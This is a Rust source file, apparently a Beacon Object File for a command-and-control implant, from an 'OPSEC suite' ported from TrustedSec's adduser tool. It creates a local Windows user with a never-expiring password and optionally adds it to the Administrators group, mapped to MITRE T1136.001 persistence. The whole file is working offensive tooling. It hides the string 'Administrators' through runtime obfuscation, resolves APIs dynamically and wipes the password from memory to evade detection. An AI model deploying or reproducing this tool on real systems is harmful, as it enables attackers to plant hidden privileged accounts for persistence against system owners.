// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
// Original C: TrustedSec/cs-remote-ops/adduser
//
//! Create a local user account and (optionally) add to Administrators.
//! Args: <user> <password> [admin]
//!
//! All wide strings are built from obfuscated ASCII at runtime; "Administrators"
//! and "USER_PRIV_USER" never appear as plaintext.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1136.001", name: "Create Account: Local Account", tactic: "Persistence" },
];

const USER_PRIV_USER: u32 = 1;
const UF_SCRIPT:      u32 = 0x0001;
const UF_NORMAL_ACCOUNT: u32 = 0x0200;
const UF_DONT_EXPIRE_PASSWD: u32 = 0x10000;
const NERR_SUCCESS: u32 = 0;

#[repr(C)]
struct UserInfo1 {
    name: *const u16,
    password: *const u16,
    password_age: u32,
    priv_: u32,
    home_dir: *const u16,
    comment: *const u16,
    flags: u32,
    script_path: *const u16,
}

#[repr(C)]
struct LocalGroupMembersInfo3 {
    domainandname: *const u16,
}

dfr_fn!(
    net_user_add(server: *const u16, level: u32, buf: *const u8, parm_err: *mut u32) -> u32,
    module = "netapi32.dll",
    api    = "NetUserAdd"
);

dfr_fn!(
    net_local_group_add_members(
        server: *const u16, group: *const u16, level: u32,
        buf: *const u8, total: u32,
    ) -> u32,
    module = "netapi32.dll",
    api    = "NetLocalGroupAddMembers"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let user_ascii = String::from(parser.get_str());
    let pass_ascii = String::from(parser.get_str());
    let admin_flag = String::from(parser.get_str());
    let user_ascii = user_ascii.as_str();
    let pass_ascii = pass_ascii.as_str();
    let admin_flag = admin_flag.as_str();

    if user_ascii.is_empty() || pass_ascii.is_empty() {
        return Err("usage: adduser <user> <password> [admin]");
    }
    if user_ascii.len() > 64 { return Err("user name too long"); }
    if pass_ascii.len() > 256 { return Err("password too long"); }

    let mut user_w = [0u16; 65];
    let mut pass_w = [0u16; 257];
    common::str_util::ascii_to_wide_buf(user_ascii.as_bytes(), &mut user_w);
    common::str_util::ascii_to_wide_buf(pass_ascii.as_bytes(), &mut pass_w);

    let info = UserInfo1 {
        name: user_w.as_ptr(),
        password: pass_w.as_ptr(),
        password_age: 0,
        priv_: USER_PRIV_USER,
        home_dir: core::ptr::null(),
        comment: core::ptr::null(),
        flags: UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD,
        script_path: core::ptr::null(),
    };

    let mut parm_err: u32 = 0;
    let rc = unsafe {
        net_user_add(core::ptr::null(), 1, &info as *const UserInfo1 as *const u8, &mut parm_err)
    }.map_err(|_| "resolve")?;

    // Wipe password from stack as soon as we no longer need it.
    let pass_bytes = unsafe {
        core::slice::from_raw_parts_mut(pass_w.as_mut_ptr() as *mut u8, pass_w.len() * 2)
    };
    common::evasion::secure_zero(pass_bytes);

    if rc != NERR_SUCCESS {
        return Err("user add failed");
    }
    obf! { let ok = "user created"; }
    println!("[+] {}: {}", ok, user_ascii);

    if admin_flag.eq_ignore_ascii_case("admin") {
        // "Administrators" group — built from obfuscated ASCII at runtime.
        let mut grp_w = [0u16; 32];
        obf! { let admins_ascii = "Administrators"; }
        common::str_util::ascii_to_wide_buf(admins_ascii.as_bytes(), &mut grp_w);

        // We need DomainAndName as "<host>\<user>". Use ".\<user>" for local.
        let mut dn_w = [0u16; 96];
        let mut dn_ascii = [0u8; 96];
        let mut n = 0usize;
        for &b in b".\\" { if n < dn_ascii.len() { dn_ascii[n] = b; n += 1; } }
        for &b in user_ascii.as_bytes() { if n < dn_ascii.len() { dn_ascii[n] = b; n += 1; } }
        common::str_util::ascii_to_wide_buf(&dn_ascii[..n], &mut dn_w);

        let mem = LocalGroupMembersInfo3 { domainandname: dn_w.as_ptr() };
        let rc2 = unsafe {
            net_local_group_add_members(
                core::ptr::null(), grp_w.as_ptr(), 3,
                &mem as *const LocalGroupMembersInfo3 as *const u8, 1,
            )
        }.map_err(|_| "resolve")?;
        if rc2 != NERR_SUCCESS {
            return Err("group add failed");
        }
        obf! { let ok2 = "added to admins"; }
        println!("[+] {}", ok2);
    }

    Ok(())
}
